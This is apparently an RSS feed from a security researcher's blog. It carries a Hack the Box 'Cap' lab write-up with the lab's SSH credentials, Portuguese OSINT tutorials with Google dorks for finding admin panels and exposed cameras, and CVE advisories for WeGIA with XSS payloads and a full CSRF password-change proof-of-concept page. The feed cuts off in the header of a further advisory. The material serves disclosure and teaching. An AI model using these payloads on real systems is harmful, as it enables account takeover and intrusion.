<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>Posts on Natan Maia Morette</title>
        <link>https://nmmorette.github.io/posts/</link>
        <description>Recent content in Posts on Natan Maia Morette</description>
        <generator>Hugo -- gohugo.io</generator>
        <language>en-us</language>
        <copyright>Natan Morette</copyright>
        <lastBuildDate>Tue, 11 Feb 2025 00:00:00 +0000</lastBuildDate>
        <atom:link href="https://nmmorette.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
        
        <item>
            <title>Hack the Box - Cap - Write Up</title>
            <link>https://nmmorette.github.io/posts/2025/02/hack-the-box-cap-write-up/</link>
            <pubDate>Tue, 11 Feb 2025 00:00:00 +0000</pubDate>
            
            <guid>https://nmmorette.github.io/posts/2025/02/hack-the-box-cap-write-up/</guid>
            <description>Cap Enumeration nmap - 10.10.10.245 Initial enumeration using nmap:
21/tcp open ftp 22/tcp open ssh 80/tcp open http In these situations, I typically start with port 80 and begin the enumeration process there.
80-HTTP 80/tcp open http gunicorn |_http-title: Security Dashboard |_http-server-header: gunicorn Analyzing the webpage, I identified some network functions, such as netstat and ifconfig.
My first thought was to attempt command injection, but it was not possible. However, upon further inspection of the Security Snapshot page, I discovered the ability to download a .</description>
            <content type="html"><![CDATA[<h1 id="cap">Cap</h1>
<p>
    <img src="/images/htb/banner.png"  class="center"  style="border-radius: 10px;"  />



    <img src="/images/htb/cap/banner.png"  class="center"  style="border-radius: 10px;"  />

</p>
<h2 id="enumeration">Enumeration</h2>
<h3 id="nmap---101010245">nmap - 10.10.10.245</h3>
<p>Initial enumeration using <code>nmap</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
</code></pre></div><p>In these situations, I typically start with port 80 and begin the enumeration process there.</p>
<h3 id="80-http">80-HTTP</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">80/tcp open  http    gunicorn
|_http-title: Security Dashboard
|_http-server-header: gunicorn

</code></pre></div><p>Analyzing the webpage, I identified some network functions, such as <code>netstat</code> and <code>ifconfig</code>.</p>
<p>My first thought was to attempt command injection, but it was not possible. However, upon further inspection of the <code>Security Snapshot</code> page, I discovered the ability to download a <code>.pcap</code> file. The URL was vulnerable to an Insecure Direct Object Reference (IDOR), allowing me to modify the file number and download other <code>.pcap</code> files.</p>
<p>After reviewing files 1, 2, and 3, I didn’t find anything significant. However, I decided to check if there was a file numbered <code>0</code>.</p>

    <img src="/images/htb/cap/image.png"  class="center"  style="border-radius: 10px;"  />


<p>After downloading and opening the <code>.pcap</code> file, I found sensitive data in an FTP connection:</p>

    <img src="/images/htb/cap/image%201.png"  class="center"  style="border-radius: 10px;"  />


<h2 id="initial-access">Initial Access</h2>
<h3 id="ssh">SSH</h3>
<p>USER nathan</p>
<p>PASS Buck3tH4TF0RM3!</p>
<p>With these credentials, I was able to connect via <code>ssh</code>:

    <img src="/images/htb/cap/image%202.png"  class="center"  style="border-radius: 10px;"  />

</p>
<p>Now, I could retrieve the user flag from the home directory.</p>

    <img src="/images/htb/cap/image%204.png"  class="center"  style="border-radius: 10px;"  />


<h3 id="local-enumeration">Local Enumeration</h3>
<p>During manual enumeration, I discovered that Python had capabilities set:</p>

    <img src="/images/htb/cap/image%204.png"  class="center"  style="border-radius: 10px;"  />


<h2 id="privesc">PrivESC</h2>
<p>Checking <code>GTFOBins</code> for ways to exploit Python’s capabilities:

    <img src="/images/htb/cap/image%205.png"  class="center"  style="border-radius: 10px;"  />

</p>
<p>I executed the exploit and successfully obtained the root flag:</p>

    <img src="/images/htb/cap/image%206.png"  class="center"  style="border-radius: 10px;"  />



    <img src="/images/htb/cap/image%207.png"  class="center"  style="border-radius: 10px;"  />


]]></content>
        </item>
        
        <item>
            <title>OSINT - Básico na prática pt-br</title>
            <link>https://nmmorette.github.io/posts/2024/12/osint-b%C3%A1sico-na-pr%C3%A1tica-pt-br/</link>
            <pubDate>Wed, 11 Dec 2024 00:00:00 +0000</pubDate>
            
            <guid>https://nmmorette.github.io/posts/2024/12/osint-b%C3%A1sico-na-pr%C3%A1tica-pt-br/</guid>
            <description>OSINT - Básico na prática Desafio Tryhackme ⚠️ Faça cadastro no site Tryhackme para participar do desafio.
TryHackMe | Cyber Security Training
Atalho Ferramentas úteis ⚠️ Confira esta página com diversas ferramentas úteis para OSINT, além de recomendações de livros, cursos e sites.
OSINT-NaPrática
OSINT O que é OSINT? OSINT (Open Source Intelligence) é a prática de coletar e analisar informações de fontes públicas e disponíveis para qualquer pessoa. Essas fontes podem incluir:</description>
            <content type="html"><![CDATA[<h1 id="osint---básico-na-prática">OSINT - Básico na prática</h1>
<h2 id="desafio-tryhackme">Desafio Tryhackme</h2>
<p>⚠️  Faça cadastro no site Tryhackme para participar do desafio.</p>
<p><a href="https://tryhackme.com/signup?referrer=60c8aa07896c88004bd38811" target="_blank" >TryHackMe | Cyber Security Training</a></p>
<h2 id="atalho-ferramentas-úteis">Atalho Ferramentas úteis</h2>
<p>⚠️ Confira esta página com diversas ferramentas úteis para OSINT, além de recomendações de livros, cursos e sites.</p>
<p><a href="https://start.me/p/BPN26q/osint-naprtica" target="_blank" >OSINT-NaPrática</a></p>
<h2 id="osint">OSINT</h2>

    <img src="/images/osintpratica/banner.webp"  class="center"  style="border-radius: 10px;"  />


<h3 id="o-que-é-osint">O que é OSINT?</h3>
<p>OSINT (Open Source Intelligence) é a prática de coletar e analisar informações de fontes públicas e disponíveis para qualquer pessoa. Essas fontes podem incluir:</p>
<ol>
<li><strong>Internet</strong>: Sites da web, redes sociais, blogs, fóruns, e mais.</li>
<li><strong>Publicações e Mídia</strong>: Jornais, revistas, televisão, e rádio.</li>
<li><strong>Documentos Públicos</strong>: Registros governamentais, relatórios, pesquisas, e arquivos legais.</li>
<li><strong>Dados Geoespaciais</strong>: Mapas, imagens de satélite, e dados de GPS.</li>
<li><strong>Fontes Acadêmicas e Técnicas</strong>: Artigos científicos, teses, e patentes.</li>
</ol>
<p>OSINT é amplamente utilizado por organizações de segurança, agências de inteligência, jornalistas, e empresas para obter insights e informações que podem ajudar na tomada de decisões, investigações e análise de riscos.</p>

    <img src="/images/osintpratica/Untitled.png"  class="center"  style="border-radius: 10px;"  />


<h3 id="osint-em-imagens">OSINT em Imagens</h3>
<p>Utilize ferramentas como Google, Yandex e Bing para buscas reversas de imagens. Aqui estão algumas dicas:</p>
<ul>
<li>Metadados: Extraia informações como GPS, data de criação, tipo de câmera, etc.</li>
<li>Partes da Imagem: Em buscas mais complexas, analise pequenos detalhes, como vegetação ou arquitetura, para obter informações sobre localização.</li>
</ul>
<p>⚠️ Nem sempre Metadata trazem informações de GPS exatas, logo a pesquisa reversa pode ajudar a identificar o local exato.</p>

    <img src="/images/osintpratica/Untitled%201.png"  class="center"  style="border-radius: 10px;"  />


<p>Em buscas mais complexas, partes menores como vegetação podem ser utilizadas para trazer uma localização geral.
Por exemplo, identificar um tipo de árvore e pesquisar onde aquele tipo de arvore é natural, pode ser útil na identificação do local.</p>

    <img src="/images/osintpratica/Untitled%202.png"  class="center"  style="border-radius: 10px;"  />


<h3 id="osint-usuário-e-redes-sociais">OSINT Usuário e Redes Sociais</h3>
<p>Ferramentas como   <a href="https://github.com/sherlock-project/sherlock" target="_blank" >Sherlock</a> e <a href="https://github.com/mishakorzik/UserFinder" target="_blank" >UserFinder</a>, são ótimas para encontrar se um usuário tem conta criada em uma rede social.</p>
<p>⚠️ Essas duas precisam de uma máquina linux para instação.</p>
<p>Existem outras ferramentas online para busca de usuário:</p>
<p><a href="https://www.social-searcher.com/" target="_blank" >https://www.social-searcher.com/</a></p>
<p><a href="https://instantusername.com/" target="_blank" >https://instantusername.com/</a></p>
<p><a href="https://whatsmyname.app/" target="_blank" >https://whatsmyname.app/</a></p>
<p><a href="https://namechk.com/" target="_blank" >https://namechk.com/</a></p>
<h3 id="x-twitter">X (Twitter)</h3>
<p>Algumas redes sociais fornecem uma ferramenta de busca avançada, o que é muito útil para buscar por certos períodos de tempo ou até palavras específicas.</p>
<p>No X é possível utilizar a busca avançada:https://x.com/search-advanced?lang=pt</p>
<h3 id="osint-web">OSINT Web</h3>
<p>Fazer OSINT em uma página web pode ser um processo complexo, realizado em várias camadas. No entanto, vamos abordar aqui os métodos mais simples.</p>
<p>Um ponto inicial é verificar a existência do arquivo <code>robots.txt</code>. Esse arquivo contém informações sobre páginas que o administrador do site não deseja que sejam indexadas, ou seja, páginas que não serão encontradas pelo Google ou outros mecanismos de busca.</p>
<p>Então, sempre verifique se a página investigada possui um arquivo <code>robots.txt</code> e o que de interessante tem lá dentro.</p>

    <img src="/images/osintpratica/Untitled%203.png"  class="center"  style="border-radius: 10px;"  />


<p>Verificar as tecnologias utilizadas em um site também é uma boa prática.</p>

    <img src="/images/osintpratica/Untitled%204.png"  class="center"  style="border-radius: 10px;"  />


<p><a href="https://www.wappalyzer.com/" target="_blank" >https://www.wappalyzer.com/</a></p>
<p>Outra informação que podemos tirar em páginas da web são e-mails de usuários, uma ferramenta muito útil para isso é o <a href="https://chromewebstore.google.com/detail/email-extractor/jdianbbpnakhcmfkcckaboohfgnngfcc" target="_blank" >Email-Extractor</a>, com essa extensão é possível capturar e-mails em uma página web.</p>

    <img src="/images/osintpratica/Untitled%205.png"  class="center"  style="border-radius: 10px;"  />


<p>Outras ferramentas também podem ser utilizadas para encontrar e-mails como Hunter.io:</p>
<p><a href="https://hunter.io/" target="_blank" >Find email addresses and send cold emails • Hunter</a></p>
<h3 id="google-dorks">Google Dorks</h3>
<p>Google Dorks, também conhecidos como Google Hacking, são consultas de pesquisa avançada que utilizam operadores especiais para encontrar informações específicas e muitas vezes sensíveis na web. Esses operadores permitem refinar buscas, revelar dados ocultos e acessar informações que normalmente não seriam facilmente encontradas através de uma pesquisa padrão.</p>
<h4 id="principais-operadores-de-google-dorks">Principais Operadores de Google Dorks</h4>
<ol>
<li><strong><code>site:</code></strong>
<ul>
<li>Restringe a busca a um site específico.</li>
<li>Exemplo: <code>site:example.com</code> mostra resultados apenas do site example.com.</li>
</ul>
</li>
<li><strong><code>intitle:</code></strong>
<ul>
<li>Busca páginas que tenham palavras específicas no título.</li>
<li>Exemplo: <code>intitle:&quot;login&quot;</code> retorna páginas com &ldquo;login&rdquo; no título.</li>
</ul>
</li>
<li><strong><code>inurl:</code></strong>
<ul>
<li>Busca páginas que tenham palavras específicas na URL.</li>
<li>Exemplo: <code>inurl:admin</code> retorna páginas com &ldquo;admin&rdquo; na URL.</li>
</ul>
</li>
<li><strong><code>filetype:</code></strong>
<ul>
<li>Restringe a busca a tipos específicos de arquivos.</li>
<li>Exemplo: <code>filetype:pdf</code> busca apenas arquivos PDF.</li>
</ul>
</li>
<li><strong><code>cache:</code></strong>
<ul>
<li>Mostra a versão em cache de uma página.</li>
<li>Exemplo: <code>cache:example.com</code> exibe a versão em cache do site example.com.</li>
</ul>
</li>
</ol>
<h4 id="exemplos-práticos-de-google-dorks">Exemplos Práticos de Google Dorks</h4>
<ol>
<li><strong>Encontrando Páginas de Login</strong>
<ul>
<li><code>intitle:&quot;login&quot; inurl:admin</code></li>
<li>Esse dork procura por páginas de login administrativas, combinando a palavra &ldquo;login&rdquo; no título e &ldquo;admin&rdquo; na URL.</li>
</ul>
</li>
<li><strong>Buscando Documentos Sensíveis</strong>
<ul>
<li><code>filetype:pdf &quot;confidential&quot;</code></li>
<li>Esse dork procura por arquivos PDF que contenham a palavra &ldquo;confidential&rdquo;.</li>
</ul>
</li>
<li><strong>Descobrindo Câmeras de Segurança Online</strong>
<ul>
<li><code>intitle:&quot;Live View / - AXIS&quot;</code></li>
<li>Esse dork retorna feeds de câmeras de segurança que usam a tecnologia AXIS.</li>
</ul>
</li>
<li><strong>Localizando Informações de Contato</strong>
<ul>
<li><code>site:example.com &quot;contact us&quot;</code></li>
<li>Esse dork encontra páginas de contato dentro de um site específico.</li>
</ul>
</li>
<li><strong>Acessando Painéis de Administração</strong>
<ul>
<li><code>inurl:admin intitle:admin</code></li>
<li>Esse dork retorna páginas que provavelmente são painéis de administração.</li>
</ul>
</li>
</ol>
<h1 id="desafio">Desafio</h1>
<p>O desafio educativo criado para esse conteúdo foi realizado em duas ocasiões em 2024, na Globo Sec Week e na Pós Graduação em Defesa cibernética da Escola Superior de Guerra.
Ambos desafios são iguais, alterando somente as flags.</p>
<p><a href="https://tryhackme.com/jr/osintcssdc2024" target="_blank" >https://tryhackme.com/jr/osintcssdc2024</a></p>
<p><a href="https://tryhackme.com/jr/osintglobosecweek2024" target="_blank" >https://tryhackme.com/jr/osintglobosecweek2024</a></p>
]]></content>
        </item>
        
        <item>
            <title>OSINT - Desafio OSINT pt-br</title>
            <link>https://nmmorette.github.io/posts/2024/12/osint-desafio-osint-pt-br/</link>
            <pubDate>Wed, 11 Dec 2024 00:00:00 +0000</pubDate>
            
            <guid>https://nmmorette.github.io/posts/2024/12/osint-desafio-osint-pt-br/</guid>
            <description>Desafio OSINT Esse desafio foi feito para dois eventos em 2024, na GloboSecWeek2024 e também na turma CSSDC24 da ESG.
O desafio é o mesmo para ambos, porém as Flags são diferentes.
Links para o Desafio https://tryhackme.com/r/room/osintcssdc2024
https://tryhackme.com/jr/osintglobosecweek2024
Task 1 OSINT -Imagem Qual nome do usuário? Utilize o exiftoolpara verificar informações da imagem. Existem diversas versões online disponíveis, além da classfica versão em CLI.
É possível encontrar um nome de usuário no campo Owner Name.</description>
            <content type="html"><![CDATA[<h1 id="desafio-osint">Desafio OSINT</h1>
<p>Esse desafio foi feito para dois eventos em 2024, na GloboSecWeek2024 e também na turma CSSDC24 da ESG.</p>
<p>O desafio é o mesmo para ambos, porém as Flags são diferentes.</p>
<h2 id="links-para-o-desafio">Links para o Desafio</h2>
<p><a href="https://tryhackme.com/r/room/osintcssdc2024" target="_blank" >https://tryhackme.com/r/room/osintcssdc2024</a></p>
<p><a href="https://tryhackme.com/jr/osintglobosecweek2024" target="_blank" >https://tryhackme.com/jr/osintglobosecweek2024</a></p>
<h2 id="task-1-osint--imagem">Task 1 OSINT -Imagem</h2>
<h3 id="qual-nome-do-usuário">Qual nome do usuário?</h3>
<p>Utilize o <a href="https://exif.tools" target="_blank" ><code>exiftool</code></a>para verificar informações da imagem. Existem diversas versões online disponíveis, além da classfica versão em <code>CLI</code>.</p>
<p>É possível encontrar um nome de usuário no campo <code>Owner Name</code>.</p>

    <img src="/images/osintdesafio/image1.png"  class="center"  style="border-radius: 10px;"  />


<h3 id="qual-nome-completo-do-usuário">Qual nome completo do Usuário?</h3>
<p>Analisando as informações do arquivo é possível encontrar o nome completo no campo <code>Artist</code>.</p>

    <img src="/images/osintdesafio/image.png"  class="center"  style="border-radius: 10px;"  />


<h3 id="qual-local-a-foto-foi-tirada">Qual local a foto foi tirada?</h3>
<p>Utilizando os metadados é possível encontrar coordenadas para o local onde a foto foi tirada, porém as coordenadas não vão te levar ao local exato, para encontrar o local exato é preciso um pouco mais de pesquisa.
Utilizando a busca de imagem reversa do google é possível encontrar o local, porém pode ficar um pouco complexo devido a imagem levar a muitos locais parecidos. Sendo assim utilizando a dica que foi informada, uma rápida busca no google nos leva ao local exato.</p>
<p>Resposta: <code>Vale do Elqui</code></p>

    <img src="/images/osintdesafio/image2.png"  class="center"  style="border-radius: 10px;"  />


<h2 id="task-2-osint---social-media">Task 2 OSINT - Social Media</h2>
<h3 id="qual-cidade-de-nascimento-da-usuária">Qual cidade de nascimento da usuária?</h3>
<p>Agora com o nome da usuária é possível buscar em ferramentas de busca de redes sociais para encontrar as redes da usuária.</p>

    <img src="/images/osintdesafio/image3.png"  class="center"  style="border-radius: 10px;"  />


<p>A cidade de nascimento pode ser encontrada no twitter e facebook da usuária.</p>

    <img src="/images/osintdesafio/image4.png"  class="center"  style="border-radius: 10px;"  />



    <img src="/images/osintdesafio/image5.png"  class="center"  style="border-radius: 10px;"  />


<p>A grafia para acertar é em pt-br:</p>

    <img src="/images/osintdesafio/image6.png"  class="center"  style="border-radius: 10px;"  />


<h3 id="onde-a-usuária-esteve-no-dia-13-de-maio-de-2024">Onde a usuária esteve no dia 13 de maio de 2024?</h3>
<p>Para encontrar essa informação é preciso olhar os posts da usuária. No dia em questão ela postou uma foto. Caso não identifique o local de vista, utilize o Google images.</p>

    <img src="/images/osintdesafio/image7.png"  class="center"  style="border-radius: 10px;"  />


<p><code>Las Vegas</code></p>
<h3 id="qual-o-e-mail-da-usuária">Qual o e-mail da usuária?</h3>
<p>Dependendo de como foi sua busca, pode encontrar essa informação em locais diferentes.
Lembre-se de enumerar todas as redes sociais possíveis.</p>
<p>No github e no blog da usuária.</p>

    <img src="/images/osintdesafio/image8.png"  class="center"  style="border-radius: 10px;"  />



    <img src="/images/osintdesafio/image9.png"  class="center"  style="border-radius: 10px;"  />


<h2 id="task-3---primeira-flag">Task 3 - Primeira Flag</h2>
<h3 id="qual-a-flag-encontrada-no-repositório">Qual a flag encontrada no repositório?</h3>
<p>Nesse ponto já tens muitas informações da usuária, olhe com atenção o repositório e procure pela Flag correspondente ao evento que está participando.</p>

    <img src="/images/osintdesafio/image10.png"  class="center"  style="border-radius: 10px;"  />


<p><code>CSSDC{d204ff4b73dc945bfb1b7b134e5f4551}</code></p>
<h2 id="task-4---flag-final">Task 4 - Flag Final</h2>
<h3 id="qual-endereço-do-blog-da-usuária">Qual endereço do blog da usuária?</h3>
<p>Essa informação está no github da usuária.</p>

    <img src="/images/osintdesafio/image8.png"  class="center"  style="border-radius: 10px;"  />


<h3 id="qual-banco-de-dados-utilizado-pelo-site">Qual banco de dados utilizado pelo site?</h3>
<p>Para encontrar essa informação basta entender a tecnologia usada no site, diversas ferramentas podem ser usadas para isso.</p>
<p>Utilizando o <code>wappalyzer</code> é possível dentificar que o site é um <code>WordPress</code> e o Banco  <code>MySQL</code>.</p>

    <img src="/images/osintdesafio/image11.png"  class="center"  style="border-radius: 10px;"  />


<h3 id="busque-a-flag-no-site">Busque a Flag no Site</h3>
<p>A intenção dessa flag é despertar a curiosidade, entre e clique em todos os links do site.
Tem um pegadinha nessa, olhe com atenção que vai encontrar a flag.</p>

    <img src="/images/osintdesafio/image12.png"  class="center"  style="border-radius: 10px;"  />



    <img src="/images/osintdesafio/image13.png"  class="center"  style="border-radius: 10px;"  />


]]></content>
        </item>
        
        <item>
            <title>CVE-2024-53470:Stored XSS in gateway_pagamento.php function WeGIA</title>
            <link>https://nmmorette.github.io/posts/2024/12/cve-2024-53470stored-xss-in-gateway_pagamento.php-function-wegia/</link>
            <pubDate>Thu, 05 Dec 2024 00:00:00 +0000</pubDate>
            
            <guid>https://nmmorette.github.io/posts/2024/12/cve-2024-53470stored-xss-in-gateway_pagamento.php-function-wegia/</guid>
            <description>CVE-2024-53470:Stored XSS in gateway_pagamento.php function Vendor WeGIA (Web Gerenciador Institucional) is an integrated management system licensed under the GNU GPL v3.0, designed to enhance administration, control, and transparency for institutions.
Affected Product Code Base WeGIA - v3.2.0
Vulnerability Description A stored Cross-Site Scripting (XSS) vulnerability was identified in the WeGIA application. This vulnerability allows unauthorized scripts to be executed within the user&amp;rsquo;s browser context.
POC File: gateway_pagamento.php
Payload: &amp;lt;script&amp;gt;alert(&#39;Alert: XSS&#39;);&amp;lt;/script&amp;gt;</description>
            <content type="html"><![CDATA[<h1 id="cve-2024-53470stored-xss-in-gateway_pagamentophp-function">CVE-2024-53470:Stored XSS in gateway_pagamento.php function</h1>
<h2 id="vendor">Vendor</h2>
<p>WeGIA (Web Gerenciador Institucional) is an integrated management system licensed under the GNU GPL v3.0, designed to enhance administration, control, and transparency for institutions.</p>
<h3 id="affected-product-code-base">Affected Product Code Base</h3>
<p>WeGIA - v3.2.0</p>
<h2 id="vulnerability-description">Vulnerability Description</h2>
<p>A stored Cross-Site Scripting (XSS) vulnerability was identified in the WeGIA application. This vulnerability allows unauthorized scripts to be executed within the user&rsquo;s browser context.</p>
<h3 id="poc">POC</h3>
<p>File: <code>gateway_pagamento.php</code></p>
<p>Payload: <code>&lt;script&gt;alert('Alert: XSS');&lt;/script&gt;</code></p>
<p>Endpoint: <code>id=&quot;plataforma-endpoint&quot; name=&quot;endpoint&quot;</code></p>

    <img src="/images/CVE/2024-53470/image-1.png"  class="center"  style="border-radius: 10px;"  />


<p>File: <code>gateway_pagamento.php</code></p>
<p>Payload: <code>&lt;script&gt;alert('Alert: XSS2');&lt;/script&gt;</code></p>
<p>Endpoint: <code>id=&quot;plataforma-nome&quot; name=&quot;nome&quot;</code></p>

    <img src="/images/CVE/2024-53470/image2.png"  class="center"  style="border-radius: 10px;"  />


<p>File: <code>gateway_pagamento.php</code></p>
<p>Payload: <code>&lt;script&gt;alert('Alert: XSS3');&lt;/script&gt;</code></p>
<p>Endpoint: <code>id=&quot;plataforma-chave&quot; name=&quot;token&quot;</code>

    <img src="/images/CVE/2024-53470/image1.png"  class="center"  style="border-radius: 10px;"  />

</p>
<h2 id="reference">Reference</h2>
<p><a href="https://github.com/nilsonLazarin/WeGIA/issues/789" target="_blank" >https://github.com/nilsonLazarin/WeGIA/issues/789</a></p>
<p><a href="https://www.wegia.org/" target="_blank" >https://www.wegia.org</a></p>
<p><a href="https://github.com/nilsonmori/WeGIA" target="_blank" >https://github.com/nilsonmori/WeGIA</a></p>
<h2 id="discoverer">Discoverer</h2>
<blockquote>
<p><a href="https://nmmorette.github.io" target="_blank" >Natan Maia Morette</a> and <a href="https://www.linkedin.com/in/diegocbcastro/" target="_blank" >Diego Cardoso Borda Castro</a>, Nov 2024.</p>
</blockquote>
]]></content>
        </item>
        
        <item>
            <title>CVE-2024-53471:Stored XSS in meio_pagamento.php function WeGIA</title>
            <link>https://nmmorette.github.io/posts/2024/12/cve-2024-53471stored-xss-in-meio_pagamento.php-function-wegia/</link>
            <pubDate>Thu, 05 Dec 2024 00:00:00 +0000</pubDate>
            
            <guid>https://nmmorette.github.io/posts/2024/12/cve-2024-53471stored-xss-in-meio_pagamento.php-function-wegia/</guid>
            <description>CVE-2024-53471:Stored XSS in meio_pagamento.php function Vendor WeGIA (Web Gerenciador Institucional) is an integrated management system licensed under the GNU GPL v3.0, designed to enhance administration, control, and transparency for institutions.
Affected Product Code Base WeGIA - v3.2.0
Vulnerability Description A stored Cross-Site Scripting (XSS) vulnerability was identified in the WeGIA application. This vulnerability allows unauthorized scripts to be executed within the user&amp;rsquo;s browser context.
POC File: meio_pagamento.php
Payload: &amp;lt;script&amp;gt;alert(&#39;Alert: XSS4&#39;);&amp;lt;/script&amp;gt;</description>
            <content type="html"><![CDATA[<h1 id="cve-2024-53471stored-xss-in-meio_pagamentophp-function">CVE-2024-53471:Stored XSS in meio_pagamento.php function</h1>
<h2 id="vendor">Vendor</h2>
<p>WeGIA (Web Gerenciador Institucional) is an integrated management system licensed under the GNU GPL v3.0, designed to enhance administration, control, and transparency for institutions.</p>
<h3 id="affected-product-code-base">Affected Product Code Base</h3>
<p>WeGIA - v3.2.0</p>
<h2 id="vulnerability-description">Vulnerability Description</h2>
<p>A stored Cross-Site Scripting (XSS) vulnerability was identified in the WeGIA application. This vulnerability allows unauthorized scripts to be executed within the user&rsquo;s browser context.</p>
<h3 id="poc">POC</h3>
<p>File: <code>meio_pagamento.php</code></p>
<p>Payload: <code>&lt;script&gt;alert('Alert: XSS4');&lt;/script&gt;</code></p>
<p>Endpoint: <code>id=&quot;meio-pagamento-nome&quot;;name=&quot;nome&quot;</code></p>

    <img src="/images/CVE/2024-53471/image.png"  class="center"  style="border-radius: 10px;"  />


<h2 id="reference">Reference</h2>
<p><a href="https://github.com/nilsonLazarin/WeGIA/issues/789" target="_blank" >https://github.com/nilsonLazarin/WeGIA/issues/789</a></p>
<p><a href="https://www.wegia.org/" target="_blank" >https://www.wegia.org</a></p>
<p><a href="https://github.com/nilsonmori/WeGIA" target="_blank" >https://github.com/nilsonmori/WeGIA</a></p>
<h2 id="discoverer">Discoverer</h2>
<blockquote>
<p><a href="https://nmmorette.github.io" target="_blank" >Natan Maia Morette</a> and <a href="https://www.linkedin.com/in/diegocbcastro/" target="_blank" >Diego Cardoso Borda Castro</a>, Nov 2024.</p>
</blockquote>
]]></content>
        </item>
        
        <item>
            <title>CVE-2024-53472:CSRF in control.php to change password WeGIA</title>
            <link>https://nmmorette.github.io/posts/2024/12/cve-2024-53472csrf-in-control.php-to-change-password-wegia/</link>
            <pubDate>Thu, 05 Dec 2024 00:00:00 +0000</pubDate>
            
            <guid>https://nmmorette.github.io/posts/2024/12/cve-2024-53472csrf-in-control.php-to-change-password-wegia/</guid>
            <description>CVE-2024-53472:CSRF in control.php to change password Vendor WeGIA (Web Gerenciador Institucional) is an integrated management system licensed under the GNU GPL v3.0, designed to enhance administration, control, and transparency for institutions.
Affected Product Code Base WeGIA - v3.2.0
Vulnerability Description A Cross-Site Request Forgery (CSRF) vulnerability was identified in the WeGIA application. This flaw enables an attacker to induce an authenticated user to perform unintended actions without their consent or awareness.</description>
            <content type="html"><![CDATA[<h1 id="cve-2024-53472csrf-in-controlphp-to-change-password">CVE-2024-53472:CSRF in control.php to change password</h1>
<h2 id="vendor">Vendor</h2>
<p>WeGIA (Web Gerenciador Institucional) is an integrated management system licensed under the GNU GPL v3.0, designed to enhance administration, control, and transparency for institutions.</p>
<h3 id="affected-product-code-base">Affected Product Code Base</h3>
<p>WeGIA - v3.2.0</p>
<h2 id="vulnerability-description">Vulnerability Description</h2>
<p>A Cross-Site Request Forgery (CSRF) vulnerability was identified in the WeGIA application. This flaw enables an attacker to induce an authenticated user to perform unintended actions without their consent or awareness.</p>
<h3 id="poc">POC</h3>
<p>This code allows an attacker to change the password of an authenticated user without their consent by loading this malicious page while the user is logged into the application.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html"><span style="color:#75715e">&lt;!DOCTYPE html&gt;</span>
&lt;<span style="color:#f92672">html</span> <span style="color:#a6e22e">lang</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;en&#34;</span>&gt;
&lt;<span style="color:#f92672">head</span>&gt;
    &lt;<span style="color:#f92672">meta</span> <span style="color:#a6e22e">charset</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;UTF-8&#34;</span>&gt;
    &lt;<span style="color:#f92672">title</span>&gt;CSRF Exploit&lt;/<span style="color:#f92672">title</span>&gt;
&lt;/<span style="color:#f92672">head</span>&gt;
&lt;<span style="color:#f92672">body</span>&gt;
    &lt;<span style="color:#f92672">script</span>&gt;
        <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#34;https://demo.wegia.org/controle/control.php&#34;</span>, {
            <span style="color:#a6e22e">method</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;POST&#34;</span>,
            <span style="color:#a6e22e">headers</span><span style="color:#f92672">:</span> {
                <span style="color:#e6db74">&#34;Content-Type&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;application/x-www-form-urlencoded&#34;</span>,
                <span style="color:#e6db74">&#34;Cookie&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;_ga=GA1.1.1228908965.1730558983; PHPSESSID=1g73rg3pd1gp28a54amciflj9d; _ga_F8DXBXLV8J=GS1.1.1730838076.2.1.1730838109.27.0.0&#34;</span>
            },
            <span style="color:#a6e22e">body</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;senha_antiga=wegia&amp;nova_senha=1234567&amp;confirmar_senha=1234567&amp;nomeClasse=FuncionarioControle&amp;metodo=alterarSenha&amp;redir=logout.php&amp;id_pessoa=1&amp;alterar=Alterar&#34;</span>
        })
        .<span style="color:#a6e22e">then</span>(<span style="color:#a6e22e">response</span> =&gt; <span style="color:#a6e22e">response</span>.<span style="color:#a6e22e">text</span>())
        .<span style="color:#a6e22e">then</span>(<span style="color:#a6e22e">data</span> =&gt; <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">data</span>))
        .<span style="color:#66d9ef">catch</span>(<span style="color:#a6e22e">error</span> =&gt; <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">error</span>(<span style="color:#e6db74">&#39;Error:&#39;</span>, <span style="color:#a6e22e">error</span>));
    &lt;/<span style="color:#f92672">script</span>&gt;
&lt;/<span style="color:#f92672">body</span>&gt;
&lt;/<span style="color:#f92672">html</span>&gt;
</code></pre></div><h2 id="reference">Reference</h2>
<p><a href="https://github.com/nilsonLazarin/WeGIA/issues/790" target="_blank" >https://github.com/nilsonLazarin/WeGIA/issues/790</a></p>
<p><a href="https://www.wegia.org/" target="_blank" >https://www.wegia.org</a></p>
<p><a href="https://github.com/nilsonmori/WeGIA" target="_blank" >https://github.com/nilsonmori/WeGIA</a></p>
<h2 id="discoverer">Discoverer</h2>
<blockquote>
<p><a href="https://nmmorette.github.io" target="_blank" >Natan Maia Morette</a> and <a href="https://www.linkedin.com/in/diegocbcastro/" target="_blank" >Diego Cardoso Borda Castro</a>, Nov 2024.</p>
</blockquote>
]]></content>
        </item>
        
        <item>
            <title>CVE-2024-53473:Broken Access Control WeGIA</title>
            <link>https://nmmorette.github.io/posts/2024/12/cve-2024-53473broken-access-control-wegia/</link>
            <pubDate>Thu, 05 Dec 2024 00:00:00 +0000</pubDate>
            
            <guid>https://nmmorette.github.io/posts/2024/12/cve-2024-53473broken-access-control-wegia/</guid>
